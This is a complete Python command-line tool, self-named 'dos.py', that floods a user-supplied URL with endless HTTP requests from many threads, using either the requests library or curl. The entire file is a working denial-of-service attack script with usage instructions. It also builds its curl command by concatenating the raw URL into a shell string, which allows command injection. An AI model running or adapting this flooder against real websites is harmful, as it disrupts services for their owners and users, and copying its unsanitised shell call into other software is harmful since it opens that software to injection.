import threading
from os import system
from sys import argv, stderr
import requests
from os import _exit

def generate(url, thread_count, verbose, py):
    if threading.active_count() < thread_count:
        current_num = 1
        print("Starting threads")
        while True:
            if threading.active_count() < thread_count:
                threading.Thread(target=ping,args=(url, thread_count, verbose, py, current_num,)).start()
                if verbose:
                    print("New thread started:", str(threading.active_count()))
                    current_num += 1
            else:
                break
    print("Pinging... (Press enter to stop)")
    input()
    _exit(0)

def ping(url, thread_count, verbose, py, num):
    global ping_count
    while True:
        if threading.active_count() == thread_count:
            if py:
                try:
                    requests.get(url)
                except requests.exceptions.MissingSchema:
                    print("Invalid URL", file=stderr)
                    _exit(1)
            else:
                system("curl " + url + " &> /dev/null")
            if verbose:
                ping_count += 1
                print("Thread pinged: " + url + " Total: " + str(ping_count) + " ID: " + str(num))



if len(argv) == 0:
    exit(0)

try:
    url = argv[1]
    if url == "--help" or url == "-h":
        print("""Usage:
    python dos.py [options] | [<destination> <# of threads> [flags]]

Flags:
    -v, --verbose: verbose output

    -p, --python: use python's built in request module instead of curl. This is much slower and more error prone. Only use this option if you do not have curl

Options:
    -h, --help: prints help message

    -V, --version: print version information
""")
        exit(0)

    if url == "--version" or url == "-V":
        print("dos-0.1.0")
        exit(0)

except IndexError:
    print("No URL provided", file=stderr)
    exit(1)

try:
    thread_count = int(argv[2]) + 1
except IndexError:
    print("No thread count provided", file=stderr)
    exit(1)
except ValueError:
    print("Non-integer thread count provided", file=stderr)
    exit(1)

ping_count = 0
verbose = False
py = False

if "-v" in argv or "--verbose" in argv:
    verbose = True

if "-p" in argv or "--python" in argv:
    py = True
    print("Using built-in python requests module")

generate(url, thread_count, verbose, py)
